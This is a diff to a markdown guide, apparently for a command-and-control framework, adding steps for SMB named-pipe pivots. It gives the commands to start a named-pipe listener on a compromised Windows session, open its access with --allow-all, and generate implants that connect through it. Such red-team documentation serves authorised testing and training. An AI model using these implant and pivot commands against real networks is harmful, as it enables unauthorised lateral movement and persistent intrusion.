@@ -19,3 +19,17 @@
 ### We can now use generate --tcp-pivot 192.168.1.1:9898 to generate an implant that will connect to the pivot listener, where 192.168.1.1 is the local IP of the server on which we started the listener.
 
 #### 2) generate --tcp-pivot 192.168.1.1:9898
+
+# Named Pipe Pivots (SMB)
+
+### Named pipe pivots are only supported on Windows. Select a session to start a named pipe listener, and then use the --bind flag to specify a pipe name. Pipes are automatically started on the local machine so you only need to specify a name, remote clients are always allowed to connect to the pipe, but the default ACL will only allow the current user/group. You can allow all user/groups by using the --allow-all flag:
+
+#### 1) use SESSION_NAME
+
+#### 2) pivots named-pipe --bind foobar
+
+### Next we generate a named pipe implant using generate --named-pipe 192.168.1.1/pipe/foobar note here we may need to specify the IP address of the listener: 192.168.1.1. The syntax is HOST/pipe/PIPE_NAME, note that . is equivalent to 127.0.0.1. This is just the standard syntax for Windows named pipes.
+
+#### 3) sessions
+
+## IMPORTANT: In some environments you may need to use the --allow-all flag when starting the pviot listener to allow all users/groups
